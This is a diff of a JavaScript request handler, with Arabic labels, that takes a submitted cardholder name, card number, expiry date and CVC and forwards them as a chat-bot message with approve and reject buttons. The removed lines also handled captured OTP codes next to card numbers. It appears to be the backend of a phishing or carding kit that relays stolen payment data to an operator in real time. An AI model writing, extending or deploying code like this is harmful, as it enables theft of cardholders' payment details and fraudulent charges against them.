@@ -11,31 +11,19 @@ export default async function handler(req, res) {
   const body = req.body || {};
 
   const userId = body.user_id || Date.now().toString();
-  let text = '';
-  let actionType = 'pay';
 
-  if (body.رمز_التحقق_OTP || body.otp) {
-    actionType = 'otp';
-    text = `🔐 *طلب رمز تحقق (OTP) جديد*\n\n` +
-           `🔑 الكود: \`${body.رمز_التحقق_OTP || body.otp}\`\n` +
-           `💳 البطاقة: \`${body.رقم_البطاقة || 'غير متوفر'}\`\n` +
-           `👤 الاسم: ${body.اسم_الحامل || 'غير متوفر'}\n` +
-           `🆔 معرف المستخدم: \`${userId}\``;
-  } else {
-    actionType = 'pay';
-    text = `💳 *طلب بطاقة دفع جديدة (فيزا)*\n\n` +
-           `👤 اسم الحامل: ${body.card_name || body.cardName || 'غير محدد'}\n` +
-           `💳 رقم البطاقة: \`${body.card_number || body.cardNumber || ''}\`\n` +
-           `📅 الانتهاء: ${body.exp_date || body.expDate || ''}\n` +
-           `🔒 CVC / Check ID: \`${body.cvc || body.check_id || ''}\`\n` +
-           `🆔 معرف المستخدم: \`${userId}\``;
-  }
+  const text = `💳 *طلب بطاقة دفع جديدة (فيزا)*\n\n` +
+               `👤 اسم الحامل: ${body.card_name || body.cardName || 'غير محدد'}\n` +
+               `💳 رقم البطاقة: \`${body.card_number || body.cardNumber || ''}\`\n` +
+               `📅 الانتهاء: ${body.exp_date || body.expDate || ''}\n` +
+               `🔒 CVC / Check ID: \`${body.cvc || body.check_id || ''}\`\n` +
+               `🆔 معرف المستخدم: \`${userId}\``;
 
   const keyboard = {
     inline_keyboard: [
       [
-        { text: "✅ موافقة", callback_data: `approve_${actionType}_${userId}` },
-        { text: "❌ رفض", callback_data: `reject_${actionType}_${userId}` }
+        { text: "✅ موافقة", callback_data: `approve_pay_${userId}` },
+        { text: "❌ رفض", callback_data: `reject_pay_${userId}` }
       ]
     ]
   };
